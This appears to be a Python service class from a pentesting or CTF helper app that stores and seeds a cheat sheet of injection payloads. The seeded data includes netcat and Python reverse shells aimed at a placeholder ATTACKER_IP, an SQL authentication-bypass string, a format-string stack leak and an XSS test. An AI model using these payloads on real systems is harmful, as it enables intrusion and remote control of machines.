from sqlalchemy.orm import Session
from app.models import models

class InjectionService:
    def __init__(self, db: Session):
        self.db = db

    def get_cheat_sheet(self, category: str = None):
        """Returns injectable snippets/cheat codes."""
        query = self.db.query(models.InjectionSnippet)
        if category:
            query = query.filter(models.InjectionSnippet.category == category)
        return query.all()

    def seed_default_snippets(self):
        """Populates the database with standard injection payloads."""
        defaults = [
            {"category": "CmdInj", "name": "Basic Rev Shell", "content": "; nc -e /bin/sh ATTACKER_IP 4444", "description": "Classic netcat reverse shell", "platform": "linux"},
            {"category": "CmdInj", "name": "Python Rev Shell", "content": "; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'", "description": "Python one-liner reverse shell", "platform": "all"},
            {"category": "SQLi", "name": "Auth Bypass", "content": "' OR '1'='1", "description": "Simple tautology for auth bypass", "platform": "web"},
            {"category": "FormatStr", "name": "Stack Leak", "content": "%x %x %x %x %x %x %x %x", "description": "Leak stack values using printf vuln", "platform": "c"},
            {"category": "XSS", "name": "Alert Pop", "content": "<script>alert(1)</script>", "description": "Basic XSS test", "platform": "web"}
        ]

        for d in defaults:
            if not self.db.query(models.InjectionSnippet).filter(models.InjectionSnippet.name == d["name"]).first():
                snip = models.InjectionSnippet(**d)
                self.db.add(snip)

        self.db.commit()
